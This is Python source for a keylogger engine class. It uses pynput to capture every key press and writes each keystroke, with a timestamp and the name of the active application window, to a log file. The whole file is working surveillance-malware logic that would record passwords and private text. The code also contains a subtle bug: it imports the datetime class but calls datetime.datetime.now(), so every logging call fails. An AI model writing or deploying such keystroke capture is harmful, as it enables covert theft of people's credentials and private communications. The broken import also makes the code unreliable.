from datetime import datetime

from pynput import keyboard

class KeyloggerEngine:
    """Core keylogging functionality"""

    def __init__(self, file_manager, get_active_window_func):
        self.file_manager = file_manager
        self.get_active_window = get_active_window_func
        self.is_running = False
        self.listener = None
        self.current_window = ""
        self.current_log_file = ""

    def start(self):
        """Start the keylogger"""
        if not self.is_running:
            self.is_running = True
            self.listener = keyboard.Listener(on_press=self._on_key_press)
            self.listener.start()

    def stop(self):
        """Stop the keylogger"""
        if self.is_running and self.listener:
            self.is_running = False
            self.listener.stop()
            self.listener = None

    def _on_key_press(self, key):
        """Handle individual key press events"""
        if not self.is_running:
            return

        log_file = self.file_manager.get_log_filename()

        # Check for new day/session
        if log_file != self.current_log_file:
            self._log_new_session(log_file)
            self.current_log_file = log_file

        # Check for window change
        active_window = self.get_active_window()
        if active_window != self.current_window:
            self._log_window_change(log_file, active_window)
            self.current_window = active_window

        # Log the keystroke
        self._log_keystroke(log_file, key)

    def _log_new_session(self, log_file):
        """Log start of new session"""
        with open(log_file, "a", encoding="utf-8") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\n{'=' * 60}\n")
            f.write(f"[{timestamp}] NEW SESSION STARTED\n")
            f.write(f"{'=' * 60}\n")

    def _log_window_change(self, log_file, window_name):
        """Log application/window change"""
        with open(log_file, "a", encoding="utf-8") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\n{'=' * 60}\n")
            f.write(f"[{timestamp}] APPLICATION: {window_name}\n")
            f.write(f"{'=' * 60}\n")

    def _log_keystroke(self, log_file, key):
        """Log individual keystroke"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        with open(log_file, "a", encoding="utf-8") as f:
            try:
                # Regular character keys
                f.write(f"[{timestamp}] {key.char}\n")
            except AttributeError:
                # Special keys
                if key == keyboard.Key.space:
                    f.write(f"[{timestamp}] [SPACE]\n")
                elif key == keyboard.Key.enter:
                    f.write(f"[{timestamp}] [ENTER]\n")
                elif key == keyboard.Key.tab:
                    f.write(f"[{timestamp}] [TAB]\n")
                elif key == keyboard.Key.backspace:
                    f.write(f"[{timestamp}] [BACKSPACE]\n")
                else:
                    f.write(f"[{timestamp}] {key}\n")